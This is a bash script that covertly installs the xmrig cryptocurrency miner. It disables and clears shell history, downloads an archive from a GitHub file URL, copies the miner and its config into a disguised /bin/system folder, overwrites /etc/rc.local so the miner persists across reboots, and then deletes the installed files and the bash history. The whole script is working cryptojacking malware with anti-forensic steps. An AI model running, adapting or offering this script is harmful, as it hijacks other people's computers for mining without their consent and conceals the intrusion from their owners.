#!/bin/bash
export HISTFILE=/dev/null export HISTSIZE=0
history -c

if [ $(uname --m) = "x86_64" ]
then
wget https://github.com/nicebbs/2/files/1915204/2.tar.gz
tar -xvf 2.tar.gz
sudo mkdir /bin/system
sudo  cp xmrig64 /bin/system
sudo cp config.json /bin/system          
sudo cp -f rc.local64 /etc/rc.local
else
sudo mkdir /bin/system
sudo  cp xmrig32 /bin/system
sudo cp config.json /bin/system          
sudo cp -f rc.local32 /etc/rc.local
fi
sudo rm -f xmrig64
sudo rm -f config.json
sudo rm -f rc.local64
sudo rm -f 2.tar.gz
sudo rm -f ./.bash_history

